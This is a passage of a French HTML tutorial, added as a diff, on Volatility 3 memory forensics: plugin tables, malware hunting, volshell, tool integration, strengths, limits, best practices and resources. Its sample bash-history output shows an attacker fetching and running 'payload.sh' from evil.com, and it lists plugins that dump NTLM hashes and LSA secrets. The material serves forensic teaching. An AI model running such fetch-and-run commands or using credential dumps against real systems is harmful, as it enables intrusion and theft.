+        <h3>Réseau</h3>
+        <table><thead><tr><th>Plugin</th><th>Rôle</th></tr></thead><tbody><tr><td><code>windows.netstat</code></td><td>Connexions TCP/UDP actives</td></tr><tr><td><code>windows.netscan</code></td><td>Scan exhaustif des structures réseau</td></tr></tbody></table>
+        <h3>Système de fichiers</h3>
+        <table><thead><tr><th>Plugin</th><th>Rôle</th></tr></thead><tbody><tr><td><code>windows.filescan</code></td><td>Scan des <code>FILE_OBJECT</code> en mémoire</td></tr><tr><td><code>windows.dumpfiles</code></td><td>Extrait des fichiers identifiés</td></tr><tr><td><code>windows.mftscan.MFTScan</code></td><td>Reconstruit la MFT depuis la mémoire</td></tr></tbody></table>
+        <h3>Registre Windows</h3>
+        <table><thead><tr><th>Plugin</th><th>Rôle</th></tr></thead><tbody><tr><td><code>windows.registry.hivelist</code></td><td>Liste les ruches chargées</td></tr><tr><td><code>windows.registry.printkey</code></td><td>Affiche une clé/valeur</td></tr><tr><td><code>windows.registry.hivescan</code></td><td>Scan exhaustif des ruches</td></tr><tr><td><code>windows.registry.userassist</code></td><td>Programmes exécutés (UserAssist)</td></tr><tr><td><code>windows.registry.shimcachemem</code></td><td>ShimCache (programmes exécutés)</td></tr><tr><td><code>windows.amcache</code></td><td>AmCache (programmes installés/exécutés)</td></tr></tbody></table>
+        <h3>Credentials</h3>
+        <table><thead><tr><th>Plugin</th><th>Rôle</th></tr></thead><tbody><tr><td><code>windows.hashdump</code></td><td><strong>Hashes NTLM du SAM</strong> (cassables avec hashcat)</td></tr><tr><td><code>windows.lsadump</code></td><td>Secrets LSA (mots de passe en clair éventuels)</td></tr><tr><td><code>windows.cachedump</code></td><td>Hashes mis en cache (logon offline)</td></tr></tbody></table>
+        <h3>Drivers et noyau</h3>
+        <table><thead><tr><th>Plugin</th><th>Rôle</th></tr></thead><tbody><tr><td><code>windows.modules</code></td><td>Liste les drivers chargés</td></tr><tr><td><code>windows.driverscan</code></td><td>Scan exhaustif des drivers</td></tr><tr><td><code>windows.devicetree</code></td><td>Arbre des devices</td></tr><tr><td><code>windows.ssdt</code></td><td>SSDT (System Service Descriptor Table)</td></tr><tr><td><code>windows.callbacks</code></td><td>Callbacks kernel</td></tr></tbody></table>
+        <h3>Activité utilisateur</h3>
+        <table><thead><tr><th>Plugin</th><th>Rôle</th></tr></thead><tbody><tr><td><code>windows.userhandles</code></td><td>Handles par utilisateur</td></tr><tr><td><code>windows.cmdscan</code> / <code>windows.consoles</code></td><td>Commandes tapées dans cmd.exe</td></tr><tr><td><code>windows.clipboard</code></td><td>Contenu du presse-papier</td></tr></tbody></table>
+        <div class="tuto-callout tip"><div class="tuto-callout-title">💡 Astuce</div><div>pour voir <strong>tous</strong> les plugins disponibles, lance simplement <code>vol -h</code> et fais défiler. Il y en a plus de <strong>150</strong>.</div></div>
+        </div>
+        <div class="tuto-section-mark">
+          <button class="tuto-mark-done" type="button">Marquer comme réussie</button>
+        </div>
+      </section>
+
+      <section class="tuto-section" id="s12" data-section-id="s12">
+        <header class="tuto-section-header">
+          <h2 class="tuto-section-title"><span class="tuto-section-num">12</span> Plugins Linux essentiels</h2>
+        </header>
+        <div class="tuto-section-content">
+        <p>L'analyse Linux nécessite d'avoir <strong>généré le symbol pack</strong> via <code>dwarf2json</code> pour le kernel exact du système analysé.</p>
+        <table><thead><tr><th>Plugin</th><th>Rôle</th></tr></thead><tbody><tr><td><code>linux.psaux</code></td><td>Processus + arguments en ligne de commande</td></tr><tr><td><code>linux.pslist</code></td><td>Liste les processus</td></tr><tr><td><code>linux.pstree</code></td><td>Arbre parent-enfant</td></tr><tr><td><code>linux.psscan</code></td><td>Scan exhaustif (processus cachés)</td></tr><tr><td><code>linux.bash</code></td><td><strong>Historique bash</strong> des utilisateurs</td></tr><tr><td><code>linux.lsof</code></td><td>Fichiers ouverts</td></tr><tr><td><code>linux.lsmod</code></td><td>Modules noyau chargés</td></tr><tr><td><code>linux.ip.Addr</code></td><td>Adresses IP par interface</td></tr><tr><td><code>linux.ip.Link</code></td><td>Interfaces réseau</td></tr><tr><td><code>linux.malfind</code></td><td>Détection de code injecté</td></tr><tr><td><code>linux.elfs</code></td><td>Fichiers ELF mappés en mémoire</td></tr><tr><td><code>linux.mount</code></td><td>Points de montage</td></tr><tr><td><code>linux.tty_check</code></td><td>Hooks suspects sur TTY (keylogger)</td></tr><tr><td><code>linux.keyboard_notifiers</code></td><td>Notifiers clavier malveillants</td></tr><tr><td><code>linux.check_modules</code></td><td>Modules cachés (rootkits)</td></tr><tr><td><code>linux.check_idt</code></td><td>Vérifie l'IDT (Interrupt Descriptor Table)</td></tr><tr><td><code>linux.envars</code></td><td>Variables d'environnement</td></tr></tbody></table>
+        <h3>Exemple : retrouver l'historique bash d'un attaquant</h3>
+        <div class="tuto-cmd"><div class="tuto-cmd-header"><span class="tuto-cmd-lang">bash</span><button class="tuto-cmd-copy" type="button">📋 Copier</button></div><pre><code>vol -f linux_memory.raw linux.bash</code></pre></div>
+        <p>Sortie typique :</p>
+        <div class="tuto-cmd"><div class="tuto-cmd-header"><span class="tuto-cmd-lang">shell</span><button class="tuto-cmd-copy" type="button">📋 Copier</button></div><pre><code>PID    Process    CommandTime              Command
+1234   bash       2026-01-15 14:23:45      curl http://evil.com/payload.sh
+1234   bash       2026-01-15 14:24:01      chmod +x payload.sh
+1234   bash       2026-01-15 14:24:08      ./payload.sh</code></pre></div>
+        <p><strong>Or en clair</strong>.</p>
+        </div>
+        <div class="tuto-section-mark">
+          <button class="tuto-mark-done" type="button">Marquer comme réussie</button>
+        </div>
+      </section>
+
+      <section class="tuto-section" id="s13" data-section-id="s13">
+        <header class="tuto-section-header">
+          <h2 class="tuto-section-title"><span class="tuto-section-num">13</span> Plugins macOS essentiels</h2>
+        </header>
+        <div class="tuto-section-content">
+        <table><thead><tr><th>Plugin</th><th>Rôle</th></tr></thead><tbody><tr><td><code>mac.pslist</code></td><td>Liste les processus</td></tr><tr><td><code>mac.pstree</code></td><td>Arbre parent-enfant</td></tr><tr><td><code>mac.psaux</code></td><td>Arguments en ligne de commande</td></tr><tr><td><code>mac.lsof</code></td><td>Fichiers ouverts</td></tr><tr><td><code>mac.lsmod</code></td><td>Modules kernel</td></tr><tr><td><code>mac.netstat</code></td><td>Connexions réseau</td></tr><tr><td><code>mac.malfind</code></td><td>Code injecté</td></tr><tr><td><code>mac.bash</code></td><td>Historique bash/zsh</td></tr><tr><td><code>mac.mount</code></td><td>Points de montage</td></tr><tr><td><code>mac.dmesg</code></td><td>Buffer log noyau</td></tr><tr><td><code>mac.envars</code></td><td>Variables d'environnement</td></tr><tr><td><code>mac.timers</code></td><td>Timers kernel suspects</td></tr><tr><td><code>mac.trustedbsd</code></td><td>Modules TrustedBSD malveillants</td></tr><tr><td><code>mac.socket_filters</code></td><td>Filtres socket kernel</td></tr></tbody></table>
+        <div class="tuto-callout warning"><div class="tuto-callout-title">⚠️ Attention</div><div>️ macOS est <strong>historiquement moins bien supporté</strong> que Windows et Linux à cause de la fermeture progressive d'Apple (SIP, kernel non publié en source complète).</div></div>
+        </div>
+        <div class="tuto-section-mark">
+          <button class="tuto-mark-done" type="button">Marquer comme réussie</button>
+        </div>
+      </section>
+
+      <section class="tuto-section" id="s14" data-section-id="s14">
+        <header class="tuto-section-header">
+          <h2 class="tuto-section-title"><span class="tuto-section-num">14</span> Chasse au malware avec Volatility</h2>
+        </header>
+        <div class="tuto-section-content">
+        <p>Volatility 3 dispose d'un <strong>sous-package dédié à la détection de malware</strong> : <code>windows.malware.*</code>.</p>
+        <table><thead><tr><th>Plugin</th><th>Détection</th></tr></thead><tbody><tr><td><code>windows.malfind</code></td><td>Code injecté (RWX heap sans backing file)</td></tr><tr><td><code>windows.hollowprocesses</code></td><td><strong>Process Hollowing</strong> (PEB falsifié)</td></tr><tr><td><code>windows.processghosting</code></td><td><strong>Process Ghosting</strong> (fichier supprimé en mémoire)</td></tr><tr><td><code>windows.malware.psxview</code></td><td>Compare 7 méthodes de listing → caches</td></tr><tr><td><code>windows.malware.suspicious_threads</code></td><td>Threads suspects en zone userland</td></tr><tr><td><code>windows.malware.skeleton_key_check</code></td><td>Détection Skeleton Key (compromission AD)</td></tr><tr><td><code>windows.malware.unhooked_system_calls</code></td><td>Syscalls déshookés (anti-EDR)</td></tr><tr><td><code>windows.malware.svcdiff</code></td><td>Services injectés ou modifiés</td></tr><tr><td><code>windows.malware.pebmasquerade</code></td><td>Falsification du PEB</td></tr><tr><td><code>windows.svcscan</code></td><td>Services Windows (anciens et nouveaux)</td></tr><tr><td><code>yarascan.YaraScan</code></td><td>Recherche par règles <strong>YARA</strong></td></tr></tbody></table>
+        <h3>Exemple : malfind + dump du code injecté</h3>
+        <div class="tuto-cmd"><div class="tuto-cmd-header"><span class="tuto-cmd-lang">bash</span><button class="tuto-cmd-copy" type="button">📋 Copier</button></div><pre><code># Identifier les processus avec code injecté
+vol -f memory.raw windows.malfind
+
+# Dumper la mémoire d'un processus suspect (PID 4567)
+vol -f memory.raw -o /tmp/dump windows.memmap --pid 4567 --dump
+
+# Dumper l'exécutable PE complet
+vol -f memory.raw -o /tmp/dump windows.dumpfiles --pid 4567</code></pre></div>
+        <h3>Exemple : recherche YARA</h3>
+        <div class="tuto-cmd"><div class="tuto-cmd-header"><span class="tuto-cmd-lang">bash</span><button class="tuto-cmd-copy" type="button">📋 Copier</button></div><pre><code># Avec règles dans un fichier
+vol -f memory.raw yarascan.YaraScan --yara-rules /opt/rules/cobaltstrike.yar
+
+# Avec une règle inline
+vol -f memory.raw yarascan.YaraScan --yara-string "mimikatz"</code></pre></div>
+        <h3>Workflow type de chasse</h3>
+        <ol><li><strong><code>windows.info</code></strong> → identifier l'OS et confirmer l'intégrité du dump</li><li><strong><code>windows.pstree</code></strong> → chercher des processus suspects (mauvais parent, nom obfusqué)</li><li><strong><code>windows.cmdline</code></strong> → examiner les arguments (URLs, base64, PowerShell encoded)</li><li><strong><code>windows.malfind</code></strong> → repérer les injections</li><li><strong><code>windows.netscan</code></strong> → IPs externes suspectes</li><li><strong><code>windows.hollowprocesses</code></strong> + <strong><code>windows.processghosting</code></strong> → techniques avancées</li><li><strong><code>yarascan</code></strong> avec règles publiques → corrélation IoC</li><li><strong>Dump</strong> des processus suspects pour analyse statique (avec <code>dumpfiles</code> ou <code>memmap --dump</code>)</li></ol>
+        </div>
+        <div class="tuto-section-mark">
+          <button class="tuto-mark-done" type="button">Marquer comme réussie</button>
+        </div>
+      </section>
+
+      <section class="tuto-section" id="s15" data-section-id="s15">
+        <header class="tuto-section-header">
+          <h2 class="tuto-section-title"><span class="tuto-section-num">15</span> volshell : exploration interactive</h2>
+        </header>
+        <div class="tuto-section-content">
+        <p><code>volshell</code> est un <strong>REPL Python interactif</strong> qui permet d'explorer un dump comme on explorerait un système live. C'est l'outil indispensable des analystes expérimentés et des développeurs de plugins.</p>
+        <h3>Lancement</h3>
+        <div class="tuto-cmd"><div class="tuto-cmd-header"><span class="tuto-cmd-lang">bash</span><button class="tuto-cmd-copy" type="button">📋 Copier</button></div><pre><code>volshell -f memory.raw
+
+# Forcer un OS spécifique
+volshell -w -f memory.raw   # Windows
+volshell -l -f memory.raw   # Linux
+volshell -m -f memory.raw   # macOS</code></pre></div>
+        <h3>Exemples de commandes interactives</h3>
+        <div class="tuto-cmd"><div class="tuto-cmd-header"><span class="tuto-cmd-lang">python</span><button class="tuto-cmd-copy" type="button">📋 Copier</button></div><pre><code># Lister les processus
+&gt;&gt;&gt; ps()
+
+# Changer de contexte processus
+&gt;&gt;&gt; cc(pid=1234)
+
+# Lire la mémoire à une adresse
+&gt;&gt;&gt; hh(0x7ff6_3000_0000, 256)   # hexdump 256 octets
+
+# Naviguer dans une structure
+&gt;&gt;&gt; proc = list(ps())[0]
+&gt;&gt;&gt; proc.UniqueProcessId
+&gt;&gt;&gt; proc.ImageFileName.cast("string", max_length=15)
+
+# Désassembler à une adresse
+&gt;&gt;&gt; dis(0x7ff6_3000_0000)</code></pre></div>
+        <p>C'est extrêmement puissant pour aller au-delà des plugins prédéfinis.</p>
+        </div>
+        <div class="tuto-section-mark">
+          <button class="tuto-mark-done" type="button">Marquer comme réussie</button>
+        </div>
+      </section>
+
+      <section class="tuto-section" id="s16" data-section-id="s16">
+        <header class="tuto-section-header">
+          <h2 class="tuto-section-title"><span class="tuto-section-num">16</span> Intégration avec d'autres outils</h2>
+        </header>
+        <div class="tuto-section-content">
+        <h3>Plaso (super-timeline)</h3>
+        <p>Le plugin <code>timeliner.Timeliner</code> génère un body file compatible avec Plaso/log2timeline :</p>
+        <div class="tuto-cmd"><div class="tuto-cmd-header"><span class="tuto-cmd-lang">bash</span><button class="tuto-cmd-copy" type="button">📋 Copier</button></div><pre><code>vol -f memory.raw --renderer csv timeliner.Timeliner &gt; mem_body.csv</code></pre></div>
+        <p>Puis injection dans la timeline Plaso :</p>
+        <div class="tuto-cmd"><div class="tuto-cmd-header"><span class="tuto-cmd-lang">bash</span><button class="tuto-cmd-copy" type="button">📋 Copier</button></div><pre><code>log2timeline --parsers mactime --storage-file case.plaso mem_body.csv</code></pre></div>
+        <div class="tuto-callout warning"><div class="tuto-callout-title">⚠️ Attention</div><div>️ Comme noté dans le tutoriel Plaso : le format Volatility3 body file demande parfois un <strong>reformatage manuel</strong> pour être ingéré sans erreur par Plaso (issue <a href="https://github.com/volatilityfoundation/volatility3/issues/542" target="_blank" rel="noopener">#542</a>).</div></div>
+        <h3>YARA</h3>
+        <p>Volatility 3 inclut le plugin <code>yarascan</code> pour appliquer des <strong>règles YARA</strong> sur l'image mémoire entière ou sur des processus spécifiques :</p>
+        <div class="tuto-cmd"><div class="tuto-cmd-header"><span class="tuto-cmd-lang">bash</span><button class="tuto-cmd-copy" type="button">📋 Copier</button></div><pre><code>vol -f memory.raw yarascan.YaraScan --yara-rules rules.yar --pid 1234</code></pre></div>
+        <h3>Sigma rules (via Timesketch)</h3>
+        <p>Une fois la timeline générée et injectée dans <strong>Timesketch</strong>, on peut appliquer des <strong>Sigma rules</strong> pour automatiser la détection de patterns malveillants.</p>
+        <h3>Bulk_extractor</h3>
+        <p>Si <code>windows.netscan</code> est instable (notamment sur d'anciens builds Windows), <strong>bulk_extractor</strong> est une alternative pour extraire un fichier <code>.pcap</code> directement depuis la mémoire :</p>
+        <div class="tuto-cmd"><div class="tuto-cmd-header"><span class="tuto-cmd-lang">bash</span><button class="tuto-cmd-copy" type="button">📋 Copier</button></div><pre><code>bulk_extractor -o output/ memory.raw</code></pre></div>
+        <h3>IPED / Autopsy</h3>
+        <p>Aucun lien direct, mais le workflow professionnel combine :</p>
+        <ol><li><strong>IPED ou Autopsy</strong> pour le disque</li><li><strong>Volatility 3</strong> pour la RAM</li><li><strong>Plaso + Timesketch</strong> pour fusionner les deux timelines</li><li><strong>YARA + Sigma</strong> pour la détection automatique</li></ol>
+        </div>
+        <div class="tuto-section-mark">
+          <button class="tuto-mark-done" type="button">Marquer comme réussie</button>
+        </div>
+      </section>
+
+      <section class="tuto-section" id="s17" data-section-id="s17">
+        <header class="tuto-section-header">
+          <h2 class="tuto-section-title"><span class="tuto-section-num">17</span> Forces de Volatility 3</h2>
+        </header>
+        <div class="tuto-section-content">
+        <p>✅ <strong>Standard de facto mondial</strong> pour l'analyse de RAM. <strong>Aucun équivalent open source à ce niveau</strong>.</p>
+        <p>✅ <strong>Multi-plateforme</strong> : analyse Windows, Linux, macOS depuis n'importe quel poste analyste.</p>
+        <p>✅ <strong>Multi-format</strong> : RAW, LIME, crashdump, VMware <code>.vmem</code>/<code>.vmss</code>, hiberfil.sys, EWF, etc.</p>
+        <p>✅ <strong>Détection automatique de l'OS</strong> : plus besoin de spécifier un profile comme dans Vol2 — gain de temps énorme.</p>
+        <p>✅ <strong>Architecture modulaire</strong> : extensible facilement en Python (plugins tiers, ISF customs).</p>
+        <p>✅ <strong>150+ plugins prêts à l'emploi</strong>, couvrant processus, réseau, registre, credentials, malware, kernel.</p>
+        <p>✅ **Sous-package <code>windows.malware.*</code>** spécialisé dans la chasse au malware avancé (Process Hollowing, Ghosting, etc.).</p>
+        <p>✅ <strong>volshell</strong> : exploration interactive Python du dump, parfaite pour les analystes confirmés.</p>
+        <p>✅ <strong>Communauté DFIR active</strong> : Slack officiel, blog <code>volatility-labs.blogspot.com</code>, conférences (OMFW — Open Memory Forensics Workshop).</p>
+        <p>✅ <strong>Documentation Read the Docs</strong> complète : <<a href="https://volatility3.readthedocs.io" target="_blank" rel="noopener">https://volatility3.readthedocs.io</a>></p>
+        <p>✅ <strong>Téléchargement automatique des symboles Windows</strong> depuis Microsoft Symbol Server — transparent pour l'utilisateur.</p>
+        <p>✅ <strong>Plusieurs renderers</strong> (texte, JSON, CSV, HTML) pour intégration dans des pipelines.</p>
+        <p>✅ <strong>Performances grandement améliorées</strong> par rapport à Vol2 sur les dumps modernes (>16 Go).</p>
+        <p>✅ <strong>Référence judiciaire</strong> : utilisé et reconnu dans les expertises forensiques officielles dans de nombreux pays.</p>
+        <p>✅ <strong>Gratuit</strong>, contrairement aux alternatives commerciales comme <strong>Volexity Volcano</strong>, <strong>Magnet AXIOM Cyber</strong> ou <strong>F-Response</strong>.</p>
+        <p>✅ <strong>Inclus par défaut</strong> dans <strong>Kali</strong>, <strong>SIFT Workstation</strong>, <strong>REMnux</strong>, <strong>Tsurugi</strong>, <strong>CSI Linux</strong>, etc.</p>
+        <p>✅ <strong>Fondation à but non lucratif</strong> (Volatility Foundation) → pérennité du projet.</p>
+        </div>
+        <div class="tuto-section-mark">
+          <button class="tuto-mark-done" type="button">Marquer comme réussie</button>
+        </div>
+      </section>
+
+      <section class="tuto-section" id="s18" data-section-id="s18">
+        <header class="tuto-section-header">
+          <h2 class="tuto-section-title"><span class="tuto-section-num">18</span> Faiblesses et limites</h2>
+        </header>
+        <div class="tuto-section-content">
+        <p>❌ <strong>Licence VSL non standard</strong> : la <strong>Volatility Software License v1.0</strong> n'est ni Apache ni GPL — certaines entreprises strictes sur les licences open source (CNCF, FSF…) la considèrent comme non conforme. Vérifier la compatibilité juridique avant intégration en produit commercial.</p>
+        <p>❌ <strong>Plugins Vol2 non tous portés</strong> : malgré 6 ans depuis la sortie de Vol3, <strong>certains plugins de niche</strong> (notamment Windows XP/Vista, certaines versions Linux exotiques) <strong>n'ont pas d'équivalent</strong>. Il faut parfois retomber sur Vol2.</p>
+        <p>❌ <strong>Génération des symboles Linux/macOS complexe</strong> : nécessite <code>dwarf2json</code> + accès au <code>vmlinux</code> + <code>System.map</code> exacts du système analysé → quasi impossible si on n'a pas un accès simultané à la machine source.</p>
+        <p>❌ <strong>Performance dégradée sur très gros dumps</strong> (>64 Go) : peut prendre plusieurs heures sur certains plugins comme <code>psscan</code> ou <code>filescan</code>.</p>
+        <p>❌ <strong>Premier lancement long</strong> : l'indexation initiale du pack de symboles prend 5-30 minutes — déconcertant pour un nouvel utilisateur qui pense que l'outil a planté.</p>
+        <p>❌ <strong>Aucune interface graphique officielle</strong> : tout en CLI. Pour une visualisation, il faut passer par des outils tiers comme <strong>Volexity Volcano</strong> (commercial) ou des wrappers web maison.</p>
+        <p>❌ <strong>Stabilité variable de <code>netstat</code></strong> sur les anciens Windows : nécessite parfois de basculer vers <code>netscan</code> ou bulk_extractor.</p>
+        <p>❌ <strong>Pas d'acquisition mémoire intégrée</strong> : il faut <strong>toujours</strong> un outil tiers (FTK Imager, WinPmem, LiME…) pour produire le dump.</p>
+        <p>❌ <strong>Faux positifs fréquents</strong> sur <code>malfind</code> : du code légitime (JIT JavaScript, .NET, antivirus eux-mêmes) lève le plugin. <strong>Interprétation experte indispensable</strong>.</p>
+        <p>❌ <strong>Symboles macOS limités</strong> : Apple ne publie plus les symboles complets du kernel depuis macOS Big Sur → support fragmenté.</p>
+        <p>❌ <strong>Courbe d'apprentissage forte</strong> : il faut comprendre les <strong>structures internes</strong> de l'OS (EPROCESS, ETHREAD, VAD, etc.) pour interpréter correctement les sorties.</p>
+        <p>❌ <strong>Dépendance à la fraîcheur des symboles</strong> : un Windows fraîchement patché peut ne pas avoir ses symboles disponibles → Volatility doit aller les télécharger depuis Microsoft, ce qui suppose une connexion internet (problème en environnement air-gapped).</p>
+        <p>❌ <strong>Pas de support natif des dumps Android et iOS</strong> : pour le mobile, il faut utiliser des outils dédiés (LiME pour Android, et MVT pour la forensique iOS, qui n'analyse pas la RAM).</p>
+        <p>❌ <strong>Concurrence commerciale agressive</strong> : <strong>Volexity Volcano</strong> (commercial, fait par les créateurs d'origine de Volatility) propose une expérience nettement plus polie et performante, ce qui pose la question du futur de Vol3 open source.</p>
+        <p>❌ <strong>Quelques bugs sur Windows 11 récents</strong> : les builds très récents de Windows 11 (24H2+) demandent parfois des <strong>symboles non encore publiés</strong>.</p>
+        </div>
+        <div class="tuto-section-mark">
+          <button class="tuto-mark-done" type="button">Marquer comme réussie</button>
+        </div>
+      </section>
+
+      <section class="tuto-section" id="s19" data-section-id="s19">
+        <header class="tuto-section-header">
+          <h2 class="tuto-section-title"><span class="tuto-section-num">19</span> Bonnes pratiques</h2>
+        </header>
+        <div class="tuto-section-content">
+        <p>🔹 <strong>Acquérir la RAM AVANT toute autre opération</strong> sur un système suspect — c'est le plus volatile.</p>
+        <p>🔹 <strong>Toujours dumper vers un support externe</strong> (USB, disque externe) — ne jamais écrire sur le disque local.</p>
+        <p>🔹 <strong>Calculer le hash SHA-256</strong> du dump immédiatement après acquisition et documenter avec horodatage.</p>
+        <p>🔹 <strong>Documenter le contexte</strong> : modèle de la machine, version OS, RAM totale, outil d'acquisition utilisé, opérateur, date/heure.</p>
+        <p>🔹 <strong>Travailler toujours sur une copie</strong> du dump, jamais sur l'original.</p>
+        <p>🔹 <strong>Commencer par <code>windows.info</code> / <code>linux.info</code> / <code>mac.info</code></strong> pour valider la lecture du dump.</p>
+        <p>🔹 <strong>Lancer plusieurs plugins de scan complémentaires</strong> : <code>pslist</code> (rapide) ET <code>psscan</code> (exhaustif) ET <code>psxview</code> (anti-évasion) — un rootkit peut tromper l'un mais pas tous.</p>
+        <p>🔹 <strong>Sauvegarder toutes les sorties</strong> dans un dossier dédié au cas (préférer JSON pour réutilisation ultérieure).</p>
+        <p>🔹 <strong>Utiliser le mode JSON</strong> pour pipeliner :</p>
+        <div class="tuto-cmd"><div class="tuto-cmd-header"><span class="tuto-cmd-lang">bash</span><button class="tuto-cmd-copy" type="button">📋 Copier</button></div><pre><code>vol -f mem.raw --renderer json windows.pslist | jq '.[] | select(.ImageFileName | contains("notepad"))'</code></pre></div>
+        <p>🔹 <strong>Conserver le cache de symboles</strong> entre cas — cela évite la réindexation.</p>
+        <p>🔹 <strong>Pour Linux</strong>, <strong>toujours générer les symboles dès l'acquisition</strong>, tant qu'on a accès à la machine source. Plus tard, ce sera impossible.</p>
+        <p>🔹 <strong>Combiner les sorties Volatility avec la timeline disque Plaso</strong> pour corréler événements RAM et événements disque.</p>
+        <p>🔹 <strong>Activer YARA dès la première passe</strong> avec des règles publiques (CobaltStrikeParser, ELASTIC, REVERSING LABS) — détection rapide d'IoCs connus.</p>
+        <p>🔹 <strong>Pour les VMs</strong>, <strong>privilégier les snapshots hyperviseur</strong> (<code>.vmem</code>/<code>.vmss</code>) plutôt qu'une acquisition depuis l'OS invité — pas d'empreinte de l'outil dans le dump.</p>
+        <p>🔹 <strong>Utiliser <code>volshell</code></strong> quand un plugin existant ne couvre pas exactement ton besoin — c'est plus rapide que de coder un plugin complet.</p>
+        <p>🔹 <strong>Faire du pre-triage avec <code>windows.malware.psxview</code></strong> : il combine plusieurs méthodes de détection et révèle vite les anomalies.</p>
+        <p>🔹 <strong>Sauvegarder l'environnement Python</strong> (<code>pip freeze > requirements.txt</code>) si tu travailles sur un cas judiciaire — pour reproduire exactement les résultats des années plus tard.</p>
+        <p>🔹 <strong>Mettre à jour Volatility 3 trimestriellement</strong> mais <strong>pinner la version</strong> lors d'un cas judiciaire (<code>pip install volatility3==2.27.0</code>).</p>
+        <p>🔹 <strong>Se former</strong> : la lecture de <a href="https://www.memoryanalysis.net/amf" target="_blank" rel="noopener"><em>The Art of Memory Forensics</em></a> (livre des créateurs de Volatility) est quasi obligatoire pour comprendre vraiment l'outil.</p>
+        </div>
+        <div class="tuto-section-mark">
+          <button class="tuto-mark-done" type="button">Marquer comme réussie</button>
+        </div>
+      </section>
+
+      <section class="tuto-section" id="s20" data-section-id="s20">
+        <header class="tuto-section-header">
+          <h2 class="tuto-section-title"><span class="tuto-section-num">20</span> Ressources utiles</h2>
+        </header>
+        <div class="tuto-section-content">
+        <h3>Officielles</h3>
+        <ul><li>📚 <strong>Dépôt GitHub Volatility 3</strong> : <<a href="https://github.com/volatilityfoundation/volatility3" target="_blank" rel="noopener">https://github.com/volatilityfoundation/volatility3</a>></li><li>📚 <strong>Documentation Read the Docs</strong> : <<a href="https://volatility3.readthedocs.io" target="_blank" rel="noopener">https://volatility3.readthedocs.io</a>></li><li>📚 <strong>Site officiel Volatility Foundation</strong> : <<a href="https://www.volatilityfoundation.org" target="_blank" rel="noopener">https://www.volatilityfoundation.org</a>></li><li>📚 <strong>Blog Volatility Labs</strong> : <<a href="https://volatility-labs.blogspot.com" target="_blank" rel="noopener">https://volatility-labs.blogspot.com</a>></li><li>📚 <strong>Symbol packs officiels</strong> : <<a href="https://downloads.volatilityfoundation.org/volatility3/symbols/" target="_blank" rel="noopener">https://downloads.volatilityfoundation.org/volatility3/symbols/</a>></li><li>📚 <strong>dwarf2json</strong> (génération symboles Linux/macOS) : <<a href="https://github.com/volatilityfoundation/dwarf2json" target="_blank" rel="noopener">https://github.com/volatilityfoundation/dwarf2json</a>></li><li>💬 <strong>Slack officiel</strong> : <<a href="https://www.volatilityfoundation.org/slack" target="_blank" rel="noopener">https://www.volatilityfoundation.org/slack</a>></li><li>🐦 <strong>Twitter</strong> : <a href="https://twitter.com/volatility" target="_blank" rel="noopener">@volatility</a></li></ul>
+        <h3>Livres de référence</h3>
+        <ul><li>📕 <strong>The Art of Memory Forensics</strong> (Ligh, Case, Levy, Walters — Wiley, 2014) — <strong>la bible</strong> du domaine.</li><li>📕 <strong>Practical Memory Forensics</strong> (Svetlana Ostrovskaya, Oleg Skulkin — Packt, 2022).</li></ul>
+        <h3>Tutoriels et cheat sheets</h3>
+        <ul><li>📰 <strong>Volatility 3 Cheat Sheet (onfvp)</strong> : <<a href="https://blog.onfvp.com/post/volatility-cheatsheet/" target="_blank" rel="noopener">https://blog.onfvp.com/post/volatility-cheatsheet/</a>></li><li>📰 <strong>h4rithd Volatility3 Notes</strong> : <<a href="https://docs.h4rithd.com/forensic/volatility3" target="_blank" rel="noopener">https://docs.h4rithd.com/forensic/volatility3</a>></li><li>📰 <strong>TryHackMe Volatility Room</strong> : <<a href="https://tryhackme.com/room/volatility" target="_blank" rel="noopener">https://tryhackme.com/room/volatility</a>></li><li>🎓 <strong>SANS FOR508</strong> : la formation officielle qui utilise massivement Volatility.</li></ul>
+        <h3>Outils d'acquisition</h3>
+        <ul><li>🔧 <strong>WinPmem (Velocidex)</strong> : <<a href="https://github.com/Velocidex/WinPmem" target="_blank" rel="noopener">https://github.com/Velocidex/WinPmem</a>></li><li>🔧 <strong>AVML (Microsoft)</strong> : <<a href="https://github.com/microsoft/avml" target="_blank" rel="noopener">https://github.com/microsoft/avml</a>></li><li>🔧 <strong>LiME</strong> : <<a href="https://github.com/504ensicsLabs/LiME" target="_blank" rel="noopener">https://github.com/504ensicsLabs/LiME</a>></li><li>🔧 <strong>FTK Imager</strong> : <<a href="https://www.exterro.com/digital-forensics-software/ftk-imager" target="_blank" rel="noopener">https://www.exterro.com/digital-forensics-software/ftk-imager</a>></li><li>🔧 <strong>Magnet RAM Capture</strong> : <<a href="https://www.magnetforensics.com/resources/magnet-ram-capture/" target="_blank" rel="noopener">https://www.magnetforensics.com/resources/magnet-ram-capture/</a>></li></ul>
+        <h3>Outils complémentaires</h3>
+        <ul><li>🔧 <strong>bulk_extractor</strong> : <<a href="https://github.com/simsong/bulk_extractor" target="_blank" rel="noopener">https://github.com/simsong/bulk_extractor</a>></li><li>🔧 <strong>YARA rules CobaltStrikeParser</strong> : <<a href="https://github.com/Sentinel-One/CobaltStrikeParser" target="_blank" rel="noopener">https://github.com/Sentinel-One/CobaltStrikeParser</a>></li><li>🔧 <strong>Elastic Endpoint YARA Rules</strong> : <<a href="https://github.com/elastic/protections-artifacts" target="_blank" rel="noopener">https://github.com/elastic/protections-artifacts</a>></li><li>🔧 <strong>awesome-memory-forensics</strong> (curated list) : <<a href="https://github.com/digitalisx/awesome-memory-forensics" target="_blank" rel="noopener">https://github.com/digitalisx/awesome-memory-forensics</a>></li></ul>
+        <h3>Échantillons de test</h3>
+        <ul><li>🧪 <strong>Volatility Foundation samples</strong> : <<a href="https://github.com/volatilityfoundation/volatility/wiki/Memory-Samples" target="_blank" rel="noopener">https://github.com/volatilityfoundation/volatility/wiki/Memory-Samples</a>></li><li>🧪 <strong>DFIR Madness samples</strong> : <<a href="https://dfirmadness.com" target="_blank" rel="noopener">https://dfirmadness.com</a>></li><li>🧪 <strong>MemLabs CTF</strong> : <<a href="https://github.com/stuxnet999/MemLabs" target="_blank" rel="noopener">https://github.com/stuxnet999/MemLabs</a>></li><li>🧪 <strong>CFReDS Memory Samples (NIST)</strong> : <<a href="https://cfreds.nist.gov" target="_blank" rel="noopener">https://cfreds.nist.gov</a>></li></ul>
+        <h3>Concurrents/Alternatives</h3>
